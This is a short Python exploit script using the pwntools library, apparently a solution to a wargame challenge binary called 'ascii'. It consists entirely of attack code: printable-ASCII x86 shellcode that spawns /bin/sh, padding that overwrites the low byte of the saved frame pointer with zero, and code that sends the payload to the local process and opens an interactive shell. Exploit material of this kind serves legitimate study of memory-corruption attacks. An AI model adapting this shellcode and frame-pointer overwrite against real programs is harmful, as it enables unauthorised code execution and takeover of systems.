#!/usr/bin/env python

from pwn import *

head = '\x4c\x4c\x4c\x4c\x58\x34\x3f\x50\x5c\x6a\x30\x58\x34\x30\x2d\x33\x7f\x20\x20\x50\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58'
shellcode = '\x6a\x30\x58\x34\x30\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x54\x5b\x50\x53\x54\x59\x50\x5a\x6a\x3b\x58\x34\x30'

payload = head + shellcode

# overwrite last byte of sfp to 0x00
payload += 'a' * (0xa8 - len(payload)) + '\x00'

p = process('/home/ascii/ascii')

p.send(payload)
p.interactive()
